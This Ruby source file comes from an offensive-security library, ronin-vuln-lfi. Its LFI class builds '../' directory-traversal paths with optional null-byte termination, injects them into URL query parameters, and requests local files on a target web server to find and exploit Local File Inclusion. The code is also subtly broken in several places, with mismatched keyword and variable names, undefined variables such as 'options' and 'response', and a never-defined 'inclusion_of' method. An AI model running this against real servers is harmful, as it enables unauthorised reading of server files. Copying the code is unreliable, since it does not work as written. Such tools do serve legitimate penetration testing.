#
# ronin-vuln-lfi - A small Ruby library to test for Local File Inclusion (LFI)
# vulnerabilities.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-vuln-lfi is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-vuln-lfi is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-vuln-lfi.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/vuln/lfi/exceptions/unknown_signature'
require 'ronin/vuln/lfi/signature'
require 'ronin/vuln/lfi/signatures'
require 'ronin/network/http'

require 'uri/query_params'

module Ronin
  module Vuln
    class LFI

      # The URL which is vulnerable
      attr_reader :url

      # The vulnerable query param
      attr_reader :param

      # The path prefix
      attr_reader :prefix

      # Number of directories to traverse up
      attr_reader :escape_up

      # The escape prefix to add to every LFI path
      attr_reader :escape_prefix

      # Whether to terminate the LFI path with a null byte
      attr_reader :terminate

      # Targeted Operating System (OS)
      attr_reader :os

      #
      # Creates a new LFI object.
      #
      # @param [String, URI::HTTP] url
      #   The URL to exploit.
      #
      # @param [String, Symbol] param
      #   The query parameter to perform LFI on.
      #
      # @param [String, nil] prefix
      #   Optional prefix for any Local File Inclusion path.
      #
      # @param [Integer] escape_up
      #   Number of directories to escape up.
      #
      # @param [String] separator
      #   The directory separator character.
      #
      # @param [Boolean] terminate
      #   Specifies whether to terminate the LFI path with a null byte.
      #
      # @param [:unix, :windows, nil] os
      #   Operating System to specifically target.
      #
      # @param [Net::HTTP, #get, nil] http
      #   An HTTP session to use for testing the LFI.
      #
      def initialize(url,param, prefix: nil,
                                escape_up: 4,
                                separator: '/',
                                terminate: true,
                                os: nil,
                                http: nil)
        @url   = url
        @param = param
        @http  = http

        @prefix    = prefix
        @escape_up = escape_up
        @separator = separator
        @terminate = terminate
        @os        = os

        @escape_prefix = @prefix || Array.new(@escape_up,'..').join(@separator)
      end

      #
      # Scans the URL for LFI vulnerabilities.
      #
      # @param [URI::HTTP, String] url
      #   The URL to scan.
      #
      # @param [String, Symbol, nil] param
      #   Optional query parameter to specifically test.
      #   Defaults to testing every URL query parameter.
      #
      # @param [Range<Integer>] escape_up
      #   The number of directories to attempt traversing up.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments.
      #
      # @return [LFI, nil]
      #   The discovered LFI vulnerability or `nil`.
      #
      # @since 0.2.0
      #
      def self.test(url, param: nil, escape_up: 4..17, http: nil, **kwargs)
        url = URI(url)

        params = if param then [param.to_s]
                 else          url.query_params.keys
                 end

        escape_up.each do |n|
          params.each do |param|
            lfi = new(url,param, escaped_up: n, http: http)

            if lfi.vulnerable?(options,**kwargs)
              return lfi
            end
          end
        end
      end

      #
      # Tests all query parameters in the URL for Local File Inclusion (LFI)
      # vulnerabilities.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments for {test}.
      #
      # @yield [lfi]
      #   If a block is given, it will be passed each newly discovered LFI
      #   vulnerability.
      #
      # @yieldparam [LFI] lfi
      #   A newly discoverd LFI vulnerability in one of the URL's query
      #   parameters.
      #
      # @return [Array<LFI>]
      #   All discovered LFI vulnerabilities.
      #
      def self.test_all_params(url, **kwargs)
        url   = URI(url)
        vulns = []

        url.query_params.each_key do |param|
          if (lfi = test(url, param: param, **kwargs))
            yield lfi if block_given?
            vulns << lfi
          end
        end

        return vulns
      end

      #
      # @return [Boolean]
      #   Specifies whether the LFI path will be terminated with a null
      #   byte.
      #
      def terminate?
        @terminate == true
      end

      #
      # Builds a `../../..` escaped path for the given file path.
      #
      # @param [String] path
      #   The path to escape.
      #
      # @return [String]
      #   The `../../../` escaped path.
      #
      def escaped_path_for(path)
        escaped_path = [@escape_prefix, path].join(@separator)
        escaped_path = "#{escape_path}\0" if terminate?

        return escaped_path
      end

      #
      # Builds a Local File Inclusion URL which includes a local path.
      #
      # @param [String] path
      #   The path of the local file to include.
      #
      # @return [URI::HTTP]
      #   The URL for the Local File Inclusion.
      #
      def url_for(path)
        new_url = @url.clone
        new_url.query_params[@param.to_s] = escaped_path_for(path)

        return new_url
      end

      #
      # Requests the contents of a local file.
      #
      # @param [String] path
      #   The path of the local file to request.
      # 
      # @param [:get, :post] method
      #   The HTTP method to request the local file. May be either
      #   `:get` or `:post`.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments.
      #
      # @return [String]
      #   The body of the response.
      #
      def get(path,**kwargs)
        lfi_url  = url_for(path)
        lfi_respones = request(url,**kwargs)
        body     = response.body
      end

      #
      # Requests the contents of a local file.
      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments.
      #
      # @return [String]
      #   The HTTP response from the LFI request.
      #
      # @see get
      #
      def include(path,**kwargs)
        get(path,**kwargs)
      end

      #
      # @param [Hash{Symbol => Object}] kwargs
      #   Additional keyword arguments.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to LFI.
      #
      def vulnerable?(**kwargs)
        Signature.tests.each do |sig|
          inclusion_of(sig) do |file|
            return true
          end
        end

        return false
      end

      #
      # Converts the LFI to a String.
      #
      # @return [String]
      #   The URL being exploited.
      #
      def to_s
        @url.to_s
      end

      private

      #
      # Performas an HTTP `GET` request for the given URI.
      #
      # @param [URI::HTTP] url
      #   The URL to request.
      #
      # @return [Net::HTTPResponse, #body]
      #   The response object.
      #
      def request(url)
        if @http
          @http.get(url.path)
        else
          Net::HTTP.get_response(url)
        end
      end

      #
      # @param [Signature] sig
      #   A file signature for a known file.
      #
      # @return [Array<String>]
      #   The available paths of the specified file signature.
      #
      def paths_of(sig)
        if @os
          return sig.paths_for(@os)
        else
          return sig.all_paths
        end
      end

    end
  end
end
